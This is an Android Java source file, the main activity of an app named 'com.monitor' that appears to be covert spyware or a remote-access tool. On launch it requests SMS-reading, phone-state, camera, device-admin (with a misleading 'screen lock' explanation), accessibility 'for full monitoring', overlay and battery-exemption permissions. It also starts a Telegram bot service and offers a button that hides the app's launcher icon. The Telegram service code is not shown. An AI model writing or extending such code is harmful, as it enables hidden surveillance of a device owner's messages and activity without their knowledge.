package com.monitor;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final int REQUEST_CODE_OVERLAY = 1001;
    private static final int REQUEST_CODE_ACCESSIBILITY = 1002;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Check and request all required permissions
        checkAndRequestPermissions();
        requestDeviceAdmin();
        requestAccessibilityPermission();

        // Start the bot service
        startBotService();

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);

        TextView infoText = new TextView(this);
        infoText.setText("System Setup Required.\nPlease grant all permissions below:");
        infoText.setGravity(Gravity.CENTER);
        infoText.setTextSize(18f);
        infoText.setPadding(20, 40, 20, 20);
        infoText.setTextColor(0xFF00FF00);

        // Button to hide app icon
        Button hideButton = new Button(this);
        hideButton.setText("Activate System Mode & Hide Icon");
        hideButton.setOnClickListener(new View.OnClickListener() {
				@Override
				public void onClick(View v) {
					hideAppIcon();
				}
			});

        // Button to open Accessibility settings
        Button accessibilityButton = new Button(this);
        accessibilityButton.setText("Enable Accessibility Service");
        accessibilityButton.setOnClickListener(new View.OnClickListener() {
				@Override
				public void onClick(View v) {
					openAccessibilitySettings();
				}
			});

        layout.addView(infoText);
        layout.addView(hideButton);
        layout.addView(accessibilityButton);
        setContentView(layout);
    }

    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName compName = new ComponentName(this, MyAdminReceiver.class);

        if (dpm != null && !dpm.isAdminActive(compName)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for screen lock/unlock features");
            startActivity(intent);
        }
    }

    private void checkAndRequestPermissions() {
        // POST_NOTIFICATIONS (Android 13+)
        if (Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"}, 101);
            }
        }

        // SMS permission (needed for reading SMS)
        if (checkSelfPermission("android.permission.READ_SMS") != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{"android.permission.READ_SMS"}, 102);
        }

        // Phone state (for device info)
        if (checkSelfPermission("android.permission.READ_PHONE_STATE") != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{"android.permission.READ_PHONE_STATE"}, 103);
        }

        // Camera (for flashlight)
        if (checkSelfPermission("android.permission.CAMERA") != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{"android.permission.CAMERA"}, 104);
        }

        // Battery optimization ignore
        if (Build.VERSION.SDK_INT >= 23) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }

            // Overlay permission (for toasts from service)
            if (!Settings.canDrawOverlays(this)) {
                Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
												  Uri.parse("package:" + getPackageName()));
                startActivityForResult(overlayIntent, REQUEST_CODE_OVERLAY);
            }
        }
    }

    private void requestAccessibilityPermission() {
        // Accessibility is required to monitor foreground app (Phone Activity)
        if (!isAccessibilityServiceEnabled()) {
            Toast.makeText(this, "Please enable Accessibility Service for full monitoring", Toast.LENGTH_LONG).show();
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
        try {
            int enabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
            if (enabled == 1) {
                String settingValue = Settings.Secure.getString(getContentResolver(),
																Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                return settingValue != null && settingValue.contains(service);
            }
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        return false;
    }

    private void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivityForResult(intent, REQUEST_CODE_ACCESSIBILITY);
    }

    private void startBotService() {
        try {
            Intent serviceIntent = new Intent(this, TelegramService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void hideAppIcon() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, "com.monitor.LauncherAlias");
            p.setComponentEnabledSetting(componentName,
										 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
										 PackageManager.DONT_KILL_APP);
            Toast.makeText(this, "System Mode Activated! Icon hidden.", Toast.LENGTH_LONG).show();
            finish();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
